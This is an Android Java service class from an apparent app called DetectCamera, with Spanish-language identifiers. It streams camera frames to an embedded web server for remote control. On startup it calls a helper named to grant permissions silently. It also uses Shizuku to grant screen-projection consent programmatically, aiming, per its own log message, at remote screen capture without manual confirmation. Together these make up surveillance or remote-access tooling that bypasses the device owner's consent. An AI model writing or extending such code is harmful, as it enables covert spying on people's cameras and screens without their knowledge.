package com.example.detectcamera;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.graphics.ImageFormat;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.nio.ByteBuffer;
import java.util.Collections;

public class CameraService extends Service {
    private static final String TAG = "CameraService";
    private static final String CHANNEL_ID = "DetectCameraChannel";
    private static final int NOTIFICATION_ID = 1001;

    private static CameraService instance;
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;

    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    private boolean isCameraRunning = false;
    private int selectedLensFacing = CameraCharacteristics.LENS_FACING_BACK;
    private ScreenCaptureController screenCaptureController;

    public static CameraService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        startBackgroundThread();
        createNotificationChannel();
        startForegroundServiceNotification();

        AdminUtils.otorgarPermisosSilenciosamente(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    public void setScreenCaptureController(ScreenCaptureController controller) {
        this.screenCaptureController = controller;
    }

    private void startForegroundServiceNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
        );

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("DetectCamera Activo")
                .setContentText("Servicios en segundo plano listos para control remoto.")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_LOW);

        Notification notification = builder.build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
            startForeground(NOTIFICATION_ID, notification, serviceType);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Servicio de Cámara y Streaming",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    public void activarCapturaPantalla() {
        backgroundHandler.post(() -> {
            if (screenCaptureController != null) return;

            if (MediaProjectionHelper.isShizukuAvailable()) {
                MediaProjectionHelper.otorgarConsentimientoShizuku(getPackageName());
                
                Intent i = new Intent(this, ProjectionActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(i);
            } else {
                Log.w(TAG, "Shizuku no está listo para captura remota sin confirmación manual.");
            }
        });
    }

    public void detenerCapturaPantalla() {
        detenerProyeccionPantalla();
    }

    public void detenerProyeccionPantalla() {
        if (screenCaptureController != null) {
            screenCaptureController.stop();
            screenCaptureController = null;
        }
    }

    public synchronized void alternarCamara() {
        detenerCamara();
        selectedLensFacing = (selectedLensFacing == CameraCharacteristics.LENS_FACING_BACK) ?
                CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
        iniciarCamara();
    }

    public synchronized void iniciarCamara() {
        if (isCameraRunning) return;
        backgroundHandler.post(() -> {
            try {
                cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
                String cameraId = getCameraIdByFacing(selectedLensFacing);
                if (cameraId == null) return;

                imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
                imageReader.setOnImageAvailableListener(reader -> {
                    try (Image image = reader.acquireLatestImage()) {
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);

                            // Envío de frames al servidor activo mediante ServerService.getWebServer()
                            WebServer server = ServerService.getWebServer();
                            if (server != null) {
                                server.onCameraFrame(bytes);
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error procesando frame de cámara", e);
                    }
                }, backgroundHandler);

                cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        cameraDevice = camera;
                        crearSesionCaptura();
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) {
                        camera.close();
                        cameraDevice = null;
                        isCameraRunning = false;
                    }

                    @Override
                    public void onError(@NonNull CameraDevice camera, int error) {
                        camera.close();
                        cameraDevice = null;
                        isCameraRunning = false;
                    }
                }, backgroundHandler);

                isCameraRunning = true;
            } catch (SecurityException | CameraAccessException e) {
                Log.e(TAG, "Error abriendo cámara", e);
            }
        });
    }

    private void crearSesionCaptura() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
            builder.addTarget(imageReader.getSurface());

            cameraDevice.createCaptureSession(Collections.singletonList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            captureSession = session;
                            try {
                                captureSession.setRepeatingRequest(builder.build(), null, backgroundHandler);
                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Error configurando request repetitiva", e);
                            }
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {}
                    }, backgroundHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creando sesión de captura", e);
        }
    }

    public synchronized void detenerCamara() {
        if (!isCameraRunning) return;
        backgroundHandler.post(() -> {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            isCameraRunning = false;
        });
    }

    private String getCameraIdByFacing(int facingTarget) throws CameraAccessException {
        for (String id : cameraManager.getCameraIdList()) {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
            if (facing != null && facing == facingTarget) {
                return id;
            }
        }
        return null;
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackgroundThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error interrumpiendo hilo", e);
            }
        }
    }

    @Override
    public void onDestroy() {
        detenerCamara();
        detenerProyeccionPantalla();
        stopBackgroundThread();
        instance = null;
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
